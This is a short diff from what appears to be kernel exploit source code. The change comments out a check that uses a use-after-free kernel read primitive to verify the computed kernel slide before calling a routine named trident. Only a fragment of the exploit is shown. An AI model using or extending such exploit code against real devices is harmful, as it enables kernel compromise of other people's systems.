@@ -20,13 +20,13 @@ int main(void)
     }
     LOG("slide: " ADDR, slide);
     
-    uint32_t test = kread32_via_uaf(KERNEL_BASE_ADDRESS + slide);
-    LOG("test: 0x%08x", test);
-    if(test != MACH_MAGIC)
-    {
-        ERR("kread32_via_uaf() failed");
-        return -1;
-    }
+//  uint32_t test = kread32_via_uaf(KERNEL_BASE_ADDRESS + slide);
+//  LOG("test: 0x%08x", test);
+//  if(test != MACH_MAGIC)
+//  {
+//      ERR("kread32_via_uaf() failed");
+//      return -1;
+//  }
     
     trident(slide);
     
